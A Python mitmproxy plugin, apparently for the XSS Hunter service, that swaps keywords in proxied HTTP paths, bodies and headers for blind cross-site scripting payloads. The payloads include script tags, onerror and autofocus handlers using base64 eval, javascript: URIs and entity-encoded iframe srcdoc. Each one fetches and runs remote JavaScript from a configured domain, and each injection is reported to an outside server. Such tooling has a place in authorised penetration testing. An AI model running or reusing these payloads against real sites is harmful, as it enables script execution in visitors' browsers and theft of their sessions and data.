#!/usr/bin/env python
from __future__ import unicode_literals, print_function, division
import urllib
import yaml
import random
import string
import base64

def debugit( text ):
    f = open( 'log.txt', 'a')
    f.write( text + "\n" )
    f.close()

try:
    from html import escape as html_escape # python 3.x
except ImportError:
    from cgi import escape as html_escape # python 2.x

from requests_futures.sessions import FuturesSession

try:
    with open('config.yaml', 'r') as f:
        settings = yaml.load(f)
except IOError:
    print("Error reading config.yaml, have you created one? (Hint: Try "
            "running ./generate_config.py)")
    exit()

futures_sess = FuturesSession()

def payload_id_to_payload( payload_id, payload_token ):
    js_attrib_js = 'var a=document.createElement("script");a.src="https://' + settings["domain"] + '/' + payload_token + '";document.body.appendChild(a);'

    if payload_id == "generic_script_tag_payload":
        return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"
    elif payload_id == "image_tag_payload":
        return "\"><img src=x id=" + html_escape( base64.b64encode( js_attrib_js ) ) + " onerror=eval(atob(this.id))>";
    elif payload_id == "javascript_uri_payload":
        return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + settings["domain"] + '/' + payload_token + "\\';document.body.appendChild(a)')";
    elif payload_id == "input_tag_payload":
        return "\"><input onfocus=eval(atob(this.id)) id=" + html_escape( base64.b64encode( js_attrib_js ) ) + " autofocus>";
    elif payload_id == "source_tag_payload":
        return "\"><video><source onerror=eval(atob(this.id)) id=" + html_escape( base64.b64encode( js_attrib_js ) ) + ">";
    elif payload_id == "srcdoc_tag_payload":
        return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + settings["domain"] + '/' + payload_token + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
    elif payload_id == "xhr_payload":
        return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + settings["domain"] + '/' + payload_token + '");a.send();</script>'
    elif payload_id == "getscript_payload":
        return '<script>$.getScript("//' + settings["domain"] + '/' + payload_token + '")</script>'
    else:
        return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"

def request( context, flow ):
    probe_ids = []

    # Replace all instances in HTTP path with probe markers
    req_path, path_probe_ids = replace_with_probe_markers(
            flow.request.path,
            context,
            [],
            True,
    )
    flow.request.path = req_path
    probe_ids += path_probe_ids

    # Replace all instances in HTTP body with probe markers
    req_body, body_probe_ids = replace_with_probe_markers(
            flow.request.content,
            context,
            [],
            True,
    )
    flow.request.content = req_body
    probe_ids += body_probe_ids

    # Replace all instance in HTTP headers with probe markers
    for header_key, header_value in flow.request.headers.iteritems():
        new_header_key, header_key_probe_ids = replace_with_probe_markers(
                header_key,
                context,
                [],
                False,
        )
        probe_ids += header_key_probe_ids
        flow.request.headers[ bytes( new_header_key ) ] = bytes( flow.request.headers[ header_key ] )
        if len( header_key_probe_ids ) > 0:
            del flow.request.headers[ bytes( header_key ) ]

        new_header_value, header_value_probe_ids = replace_with_probe_markers(
                header_value,
                context,
                [],
                False,
        )
        probe_ids += header_value_probe_ids
        flow.request.headers[ bytes( header_key ) ] = bytes( new_header_value )

    flow.request.headers[bytes( "Content-Length" )] = bytes( str( len( flow.request.content ) ) ) # Bullshit to patch mitmproxy's lack of auto Content-Type updating

    for probe_id in probe_ids:
        notify_probe_server({
            "request": get_full_http_request_text( flow.request ),
            "owner_correlation_key": settings["owner_correlation_key"],
            "injection_key": probe_id
        }, context)

def get_full_http_request_text(req):
    http_request_text = req.method + " " + req.path + " HTTP/1.1\r\n"
    for header_pair in req.headers.fields:
        http_request_text += header_pair[0] + ": " + header_pair[1] + "\r\n"
    http_request_text += "\r\n"
    http_request_text += req.body
    return http_request_text

def replace_with_probe_markers(input_text, context, probe_marker_list, urlencoded):
    # Iterate through all dummy words to see if we have a replacement to make
    for keyword, payload_id in settings["xss_probe_settings"].iteritems():
        # Does this keyword exist in our text
        if input_text and keyword in input_text:
            payload_token = get_random_id(10)
            payload = payload_id_to_payload( payload_id, payload_token )

            # URL encode if requested by caller
            if urlencoded:
                payload = urllib.quote_plus( payload )

            input_text = input_text.replace( keyword, payload, 1)
            probe_marker_list.append( payload_token )
            return replace_with_probe_markers( input_text, context, probe_marker_list, urlencoded )
    return input_text, probe_marker_list


def notify_probe_server(request_details, context):
    fut = futures_sess.post(
            "https://api.xsshunter.com/api/record_injection",
            headers={"Accept": "application/json"},
            json=request_details,
    )
    fut.add_done_callback(lambda x: probe_sent_cb(x, context))


def probe_sent_cb(fut, context):
    resp = fut.result()
    #context.log(resp)
    #context.log(resp.text)
    context.log( "Sent injection attempt to XSS Hunter server!")


def get_random_id(num):
    choices = string.ascii_lowercase + string.digits
    return ''.join(random.choice(choices) for _ in range(num))
